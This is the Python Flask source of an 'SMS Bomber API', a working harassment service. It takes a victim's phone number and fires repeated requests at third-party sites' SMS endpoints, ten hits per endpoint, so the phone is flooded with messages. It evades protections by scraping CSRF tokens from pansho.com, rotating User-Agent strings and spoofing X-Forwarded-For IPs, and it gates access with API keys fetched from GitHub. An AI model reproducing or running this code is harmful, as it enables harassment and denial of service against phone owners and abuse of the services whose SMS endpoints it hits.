from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup
import re

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'
LOGS_FILE = 'requests/logs.json'
KEYS_GITHUB_URL = 'https://raw.githubusercontent.com/gauravbeniwal3003-prog/sms-bomber-api/main/requests/keys.txt'

# ===== LOAD DATA =====
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    try:
        os.makedirs(os.path.dirname(file), exist_ok=True)
        with open(file, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

requests_data = load_json(REQUESTS_FILE, [])
stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
logs_data = load_json(LOGS_FILE, [])
active_keys = set()

# ===== LOAD KEYS FROM GITHUB =====
def load_keys_from_github():
    global active_keys
    try:
        resp = req_lib.get(KEYS_GITHUB_URL, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().split('\n')
            active_keys = {line.strip() for line in lines if line.strip() and not line.startswith('#')}
            print(f"✅ Loaded {len(active_keys)} keys from GitHub")
            return True
    except Exception as e:
        print(f"❌ Failed to load keys: {e}")
    return False

def validate_key(key):
    if not active_keys:
        load_keys_from_github()
    return key in active_keys

# ===== PANSHO FRESH SESSION =====
def get_fresh_pansho_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        token = None
        meta = soup.find('meta', {'name': 'csrf-token'})
        if meta:
            token = meta.get('content')
        if not token:
            token_input = soup.find('input', {'name': '_token'})
            if token_input:
                token = token_input.get('value')
        if not token:
            token = 'DUMMY_TOKEN'
        
        cookies = session.cookies.get_dict()
        if '6valley1766056533_session' in session.cookies:
            cookies['6valley1766056533_session'] = session.cookies['6valley1766056533_session']
        
        return session, cookies, token
    except Exception as e:
        print(f"❌ Pansho session failed: {e}")
        return None, None, None

# ===== SEND REQUEST =====
def send_request(req, phone):
    try:
        if 'pansho' in req['name'].lower():
            session, cookies, token = get_fresh_pansho_session()
            if not session:
                return False
            
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ])
            headers['Referer'] = 'https://pansho.com/'
            headers['Origin'] = 'https://pansho.com'
            headers['X-Requested-With'] = 'XMLHttpRequest'
            
            body = req['body'].replace('{phone}', phone).replace('{token}', token)
            session.cookies.update(cookies)
            
            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
            
        else:
            session = req_lib.Session()
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['Accept'] = 'application/json, text/plain, */*'
            
            if req['method'] == 'POST':
                if isinstance(req['body'], dict):
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=10)
                else:
                    body = req['body'].replace('{phone}', phone)
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
            else:
                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=10)
        
        with stats_lock:
            stats_data['total_requests'] += 1
            if r.status_code in [200, 302, 201, 202]:
                stats_data['success'] += 1
                save_json(STATS_FILE, stats_data)
                print(f"✅ {req['name']} | {r.status_code} | {phone}")
                return True
            elif r.status_code == 429:
                stats_data['rate_limited'] += 1
                save_json(STATS_FILE, stats_data)
                print(f"⚠️ Rate Limited | {req['name']} | {phone}")
                return False
            else:
                stats_data['failed'] += 1
                save_json(STATS_FILE, stats_data)
                print(f"❌ {req['name']} | {r.status_code} | {phone}")
                return False
    except Exception as e:
        with stats_lock:
            stats_data['total_requests'] += 1
            stats_data['failed'] += 1
            save_json(STATS_FILE, stats_data)
        print(f"❌ ERROR: {req['name']} | {phone} | {str(e)[:50]}")
        return False

# ===== ONE-SHOT BOMBING — 10x STRENGTH =====
def one_shot_bombing(phone, key):
    """Execute one round: 10x hits on all active requests with uniform speed (2 req/sec)"""
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    if not active_requests:
        return {"error": "No active requests"}
    
    # Reset stats
    global stats_data
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_json(STATS_FILE, stats_data)
    
    # === NEW: 10 HITS PER REQUEST, 2 REQ/SEC ===
    HITS_PER_REQUEST = 10
    DELAY_BETWEEN_HITS = 0.5  # 2 req/sec per request
    
    total_hits = 0
    success_hits = 0
    results = []
    
    # For each active request
    for req in active_requests:
        phone_variants = req.get('phones', [phone])
        target_phone = random.choice(phone_variants) if phone_variants else phone
        
        req_results = []
        req_success = 0
        
        # 10 hits per request with uniform speed
        for hit in range(HITS_PER_REQUEST):
            success = send_request(req, target_phone)
            total_hits += 1
            if success:
                success_hits += 1
                req_success += 1
            
            req_results.append({
                "hit": hit + 1,
                "success": success,
                "phone": target_phone
            })
            
            # Log
            with stats_lock:
                log_entry = {
                    "time": datetime.now().isoformat(),
                    "request": req['name'],
                    "phone": target_phone,
                    "status": "success" if success else "failed",
                    "hit": hit + 1,
                    "total_hits": HITS_PER_REQUEST
                }
                logs_data.append(log_entry)
                save_json(LOGS_FILE, logs_data[-500:])
            
            # Uniform speed: 0.5 sec delay between hits (2 req/sec)
            time.sleep(DELAY_BETWEEN_HITS)
        
        results.append({
            "request": req['name'],
            "hits": req_results,
            "total_success": req_success,
            "total_hits": HITS_PER_REQUEST
        })
    
    return {
        "success": True,
        "phone": phone,
        "key": key,
        "active_requests": len(active_requests),
        "hits_per_request": HITS_PER_REQUEST,
        "speed": f"{1/DELAY_BETWEEN_HITS} req/sec",
        "total_hits": total_hits,
        "success_hits": success_hits,
        "failed_hits": total_hits - success_hits,
        "stats": stats_data,
        "details": results
    }

# ===== GLOBALS =====
stats_lock = threading.Lock()

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data,
        "active_keys": len(active_keys)
    })

@app.route('/api/keys', methods=['GET'])
def get_keys():
    return jsonify({"keys": list(active_keys), "count": len(active_keys)})

@app.route('/api/keys/refresh', methods=['POST'])
def refresh_keys():
    if load_keys_from_github():
        return jsonify({"success": True, "keys": list(active_keys), "count": len(active_keys)})
    return jsonify({"error": "Failed to load keys"}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(logs_data[-limit:])

# ===== ONE-SHOT API =====
@app.route('/api', methods=['GET'])
def one_shot_api():
    key = request.args.get('key')
    phone = request.args.get('bomb')
    
    if not key:
        return jsonify({"error": "Missing 'key' parameter"}), 400
    if not validate_key(key):
        return jsonify({"error": "Invalid API key"}), 401
    if not phone:
        return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
    if not re.match(r'^\+?[0-9]{10,15}$', phone):
        return jsonify({"error": "Invalid phone number format"}), 400
    
    result = one_shot_bombing(phone, key)
    return jsonify(result)

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing_post():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    api_key = data.get('api_key') or request.headers.get('X-API-Key')
    if not api_key or not validate_key(api_key):
        return jsonify({"error": "Invalid API key"}), 401
    
    result = one_shot_bombing(phone, api_key)
    return jsonify(result)

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# ===== LOAD KEYS =====
load_keys_from_github()

app.debug = False
if __name__ == '__main__':
    app.run(debug=True, port=5000)
